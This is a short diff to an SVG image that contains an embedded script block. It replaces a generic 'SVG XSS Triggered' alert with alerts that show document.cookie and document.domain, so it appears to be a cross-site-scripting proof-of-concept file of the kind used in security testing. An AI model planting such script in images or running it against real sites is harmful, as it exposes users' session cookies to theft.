@@ -50,6 +50,7 @@ fill="#000000" stroke="none">
 -140 -211 -62 -14 -128 71 -116 148 15 92 73 150 183 183 77 23 175 34 126 14z"/>
 </g>
 	<script type="text/javascript">
-		alert("SVG XSS Triggered");
+		alert(document.cookie);
+		alert(document.domain);
 	</script>
 </svg>
